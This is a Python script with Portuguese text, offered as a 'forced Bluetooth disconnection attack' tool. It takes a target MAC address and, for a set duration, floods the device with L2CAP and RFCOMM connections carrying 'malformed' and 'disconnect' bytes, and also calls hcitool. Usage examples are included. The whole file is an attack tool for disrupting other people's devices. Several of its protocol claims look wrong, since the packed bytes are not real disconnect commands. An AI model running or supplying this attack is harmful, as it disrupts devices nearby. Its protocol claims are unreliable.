#!/usr/bin/env python3
"""
Script de Desconexão Forçada Bluetooth
Explora vulnerabilidades conhecidas para forçar desconexão
"""

import bluetooth
import sys
import time
import struct
import argparse
from socket import *

def send_malformed_packet(target_mac, port=0x1001):
    """
    Envia pacotes malformados para causar desconexão
    """
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(2)
        sock.connect((target_mac, port))
        
        # Enviar pacote malformado
        malformed_data = b'\x00' * 1000  # Dados inválidos
        sock.send(malformed_data)
        
        sock.close()
        return True
    except Exception as e:
        return False

def l2cap_connection_reset(target_mac):
    """
    Força reset de conexão L2CAP
    """
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(1)
        sock.connect((target_mac, 0x1001))
        
        # Enviar comando de desconexão
        disconnect_packet = struct.pack('>HH', 0x0001, 0x0000)  # Disconnect Request
        sock.send(disconnect_packet)
        
        time.sleep(0.1)
        sock.close()
        return True
    except:
        return False

def rfcomm_disconnect(target_mac):
    """
    Tenta desconectar via RFCOMM
    """
    for channel in range(1, 31):
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.settimeout(1)
            sock.connect((target_mac, channel))
            
            # Enviar comando de desconexão
            disconnect_cmd = b'\x53\x00'  # Disconnect command
            sock.send(disconnect_cmd)
            
            sock.close()
            return True
        except:
            continue
    return False

def acl_disconnect(target_mac):
    """
    Desconexão no nível ACL (Link Control)
    Requer acesso de baixo nível
    """
    print("[*] Tentando desconexão ACL...")
    print("[!] Este método requer privilégios root e acesso HCI")
    
    try:
        # Usar hcitool via subprocess
        import subprocess
        cmd = ['hcitool', 'dc', target_mac]
        result = subprocess.run(cmd, capture_output=True, timeout=5)
        
        if result.returncode == 0:
            return True
    except:
        pass
    
    return False

def main_attack(target_mac, duration=30, method='all'):
    """
    Executa o ataque de desconexão
    
    Args:
        target_mac: MAC do dispositivo alvo
        duration: Duração do ataque
        method: Método a usar ('l2cap', 'rfcomm', 'acl', 'all')
    """
    print(f"[*] Iniciando ataque de desconexão em {target_mac}")
    print(f"[*] Duração: {duration} segundos")
    print(f"[*] Método: {method}\n")
    
    start_time = time.time()
    attempt_count = 0
    
    methods_to_try = []
    if method == 'all':
        methods_to_try = ['l2cap', 'rfcomm', 'acl']
    else:
        methods_to_try = [method]
    
    try:
        while time.time() - start_time < duration:
            attempt_count += 1
            
            for method_name in methods_to_try:
                success = False
                
                if method_name == 'l2cap':
                    success = l2cap_connection_reset(target_mac)
                    if success:
                        print(f"[+] Desconexão L2CAP bem-sucedida (tentativa {attempt_count})")
                
                elif method_name == 'rfcomm':
                    success = rfcomm_disconnect(target_mac)
                    if success:
                        print(f"[+] Desconexão RFCOMM bem-sucedida (tentativa {attempt_count})")
                
                elif method_name == 'acl':
                    success = acl_disconnect(target_mac)
                    if success:
                        print(f"[+] Desconexão ACL bem-sucedida (tentativa {attempt_count})")
                
                if success:
                    time.sleep(0.5)  # Pequena pausa após sucesso
            
            if attempt_count % 20 == 0:
                print(f"[*] {attempt_count} tentativas realizadas...")
            
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo usuário")
    
    print(f"\n[+] Ataque concluído: {attempt_count} tentativas")
    print("[+] Verifique se o dispositivo foi desconectado")

def main():
    parser = argparse.ArgumentParser(
        description='Ataque de Desconexão Forçada Bluetooth',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python3 bluetooth_disconnect.py --target AA:BB:CC:DD:EE:FF
  python3 bluetooth_disconnect.py --target AA:BB:CC:DD:EE:FF --method l2cap --duration 60
  sudo python3 bluetooth_disconnect.py --target AA:BB:CC:DD:EE:FF --method acl
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        required=True,
        help='Endereço MAC do dispositivo alvo'
    )
    
    parser.add_argument(
        '--method', '-m',
        choices=['l2cap', 'rfcomm', 'acl', 'all'],
        default='all',
        help='Método de desconexão (padrão: all)'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=30,
        help='Duração do ataque em segundos (padrão: 30)'
    )
    
    args = parser.parse_args()
    
    # Validar MAC
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] Erro: Formato de MAC inválido")
        sys.exit(1)
    
    print("=" * 60)
    print("    ATAQUE DE DESCONEXÃO BLUETOOTH")
    print("=" * 60)
    print()
    
    if args.method == 'acl':
        print("[!] AVISO: Método ACL requer privilégios root")
        print("[!] Execute com: sudo python3 bluetooth_disconnect.py ...\n")
    
    try:
        main_attack(mac, duration=args.duration, method=args.method)
    except PermissionError:
        print("[!] Erro: Permissões insuficientes")
        print("[!] Para métodos ACL, execute com sudo")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

